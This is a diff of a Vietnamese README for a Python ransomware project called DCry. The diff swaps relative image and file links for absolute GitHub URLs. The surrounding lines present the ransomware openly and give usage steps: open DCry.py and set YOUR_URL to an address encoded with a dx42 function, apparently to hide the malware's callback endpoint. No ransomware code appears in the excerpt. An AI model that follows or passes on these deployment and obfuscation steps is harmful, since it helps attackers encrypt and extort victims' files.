@@ -4,10 +4,10 @@
 ![License](https://img.shields.io/github/license/memecoder12345678/DCry-Ransomware?style=flat\&logo=open-source-initiative\&logoColor=white)
 ![Platform](https://img.shields.io/badge/Platform-Windows-blue)
 ![Status](https://img.shields.io/badge/Status-Temporarily--Inactive-orange)
-![DCry](./DCRY.png)
+![DCry](https://github.com/memecoder12345678/DCry-Ransomware/blob/main/imgs/DCRY.png)
 Ransomware viết bằng Python 💀💀💀
 ## Cách sử dụng
-* Mở file [`DCry.py`](./src/DCry.py).
+* Mở file [`DCry.py`](https://github.com/memecoder12345678/DCry-Ransomware/blob/main/src/DCry.py).
 * Thay biến `YOUR_URL` bằng URL đã mã hóa sử dụng hàm `dx42` như sau:
   ```python
   YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()
